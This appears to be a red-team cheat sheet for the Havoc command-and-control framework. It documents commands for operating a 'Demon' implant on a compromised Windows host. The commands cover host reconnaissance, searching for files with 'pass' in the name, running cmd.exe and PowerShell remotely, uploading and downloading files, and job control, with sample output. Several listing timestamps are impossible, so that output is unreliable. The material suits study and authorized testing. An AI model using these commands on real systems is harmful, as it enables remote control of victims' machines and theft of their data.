# 02 - Basic Commands

Search Tag(s): #havoc #command-and-control #interactive-shell

## 2.1 - Check Request

```
Demon » checkin
[*] [47DC3265] Tasked demon send back a checkin request
[+] Send Task to Agent [8 bytes]
[*] Received checkin request

Teamserver:
  - Session Path       : /home/user/Havoc/Teamserver/data/loot/agents/7486e39a

Meta Data:
  - Agent ID           : 7486e39a
  - Magic Value        : 0
  - First Call In      : 02/10/2022 15:58:30
  - Last  Call In      : 02-10-2022 15:58:55
  - AES Key            : 088a0070eca06ee6fc5caaf468f0aa04f2f264c6be9cf8cc2a92b60ca4b45ea4
  - AES IV             : a4ecf6e8c8be96ac8ebe30c84ca6f2ba
  - Sleep Delay        : 5

Host Info:
  - Host Name          : DESKTOP-85J2L4M
  - User Name          : aiden
```

## 2.2 - Navigation

```
Demon » cd <directory_name>

Demon » pwd
[+] Send Task to Agent [12 bytes]
[*] Current directory: C:\Users\aiden
```

## 2.3 - Sleep and Jitter

```
Demon » sleep 10 25
```

## 2.4 - List Contents

```
Demon » dir c:\
[*] [32D45E71] Tasked demon to list directory: c:\
[+] Send Task to Agent [25 bytes]
[*] List Directory: c:\\*

 Size         Type     Last Modified         Name
 ----         ----     -------------------   ----
              dir      01/10/2022 03:21:15   $Recycle.Bin
              dir      24/09/2022 13:21:14   $WinREAgent
              dir      01/10/2022 31:58:16   Config.Msi
              dir      31/08/2022 26:19:14   Documents and Settings
 12.29 kB     file     02/10/2022 55:56:15   DumpStack.log.tmp
 738.20 MB    file     02/10/2022 55:56:15   pagefile.sys
              dir      02/10/2022 38:15:12   PerfLogs
              dir      02/10/2022 29:57:12   Program Files
              dir      02/10/2022 40:57:12   Program Files (x86)
              dir      02/10/2022 36:57:12   ProgramData
              dir      16/09/2022 34:43:22   Recovery
 268.44 MB    file     02/10/2022 55:56:15   swapfile.sys
              dir      02/10/2022 46:56:15   System Volume Information
              dir      26/09/2022 29:53:15   Temp
              dir      02/10/2022 59:13:12   Users
              dir      02/10/2022 58:56:12   Windows
```

TODO: cover each flags on what it does

```
/b -> List only
```

List only the files.

```
Demon » dir [<drive_letter>:]\path\to\directory\ /f
```

List only the directories.

```
Demon » dir [<drive_letter>:]\path\to\directory\ /d
```

Recursive through sub directories

```
Demon » dir [<drive_letter>:]\path\to\directory\ /s
```

Starts a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /starts document
```

Ends a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /ends .txt
```

Contains a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /contains pass
```

## 2.5 - File Manipulation

Create directory

```
Demon » mkdir C:\path\to\new_directory\
```

Copy file

```
Demon » cp C:\path\to\remote\file.txt C:\path\to\remote\copied_file.txt
```

Move file

```
Demon » mv C:\path\to\remote\file.txt C:\path\to\remote\moved_file.txt
```

Display content's from the file.

```
Demon » cat C:\path\to\remote\file.txt
```

Delete file

```
Demon » remove C:\path\to\remote\file.txt
```

## 2.6 - Execute Shell Commands

### 2.6.1 - Help Menu

```
Demon » help shell

 - Command       :  shell
 - Description   :  executes cmd.exe commands and gets the output
 - Behavior      :  Process Creation
 - Usage         :  shell [commands]
 - Example       :  shell dir c:\windows\system32

Demon » help powershell

 - Command       :  powershell
 - Description   :  executes powershell.exe commands and gets the output
 - Usage         :  powershell [commands]
 - Example       :  powershell dir c:\windows\system32
```

### 2.6.2 - Usage

Execute any `shell` command that the demon implant spawns a child process `cmd.exe`.

```
Demon » shell <command> [arguments]
```

Spawns a child process of `powershell.exe`.

```
Demon » powershell <cmdlet> [arguments]
```

## 2.7 - Upload and Download Files

Download files

```
Demon » download [<drive_letter>:\]path\to\remote\file.txt
```

Upload files

```
Demon » upload /path/to/local/file.txt [<drive_letter>:\]path\to\remote\file.txt
```

## 2.8 - Transfer Files Queue

```
Demon » help transfer

 - Command       :  transfer
 - Description   :  download transfer module
 - Behavior      :  API Only
 - Usage         :  transfer <subcommand>
 - Example       :  transfer list

  Command                        Description      
  ---------                      -------------     
  list                           list current downloads
  stop                           stops a download
  resume                         resumes a download
  remove                         stops and removes a download

Demon » help transfer list

 - Module        :  transfer
 - Sub Command   :  list
 - Description   :  list current downloads
 - Behavior      :  API Only

Demon » help transfer stop

 - Module        :  transfer
 - Sub Command   :  stop
 - Description   :  stops a download
 - Behavior      :  API Only
 - Usage         :  transfer stop <FileID>
 - Example       :  transfer stop ffff

Demon » help transfer resume

 - Module        :  transfer
 - Sub Command   :  resume
 - Description   :  resumes a download
 - Behavior      :  API Only
 - Usage         :  transfer resume <FileID>
 - Example       :  transfer resume ffff

Demon » help transfer remove

 - Module        :  transfer
 - Sub Command   :  remove
 - Description   :  stops and removes a download
 - Behavior      :  API Only
 - Usage         :  transfer remove <FileID>
 - Example       :  transfer remove ffff
```

## 2.9 - Jobs Queue

List job identifiers.

```
Demon » job list
```

Suspend job.

```
Demon » job suspend <job_id>
```

Resume job after suspension.

```
Demon » job resume <job_id>
```

Terminate job.

```
Demon » job kill <job_id>
```

List tasks.

```
Demon » task list
```

Clear all commands in queue to stop the task being executed.

```
Demon » task clear
```

## 2.10 - Terminate Implant

```
Demon » exit
```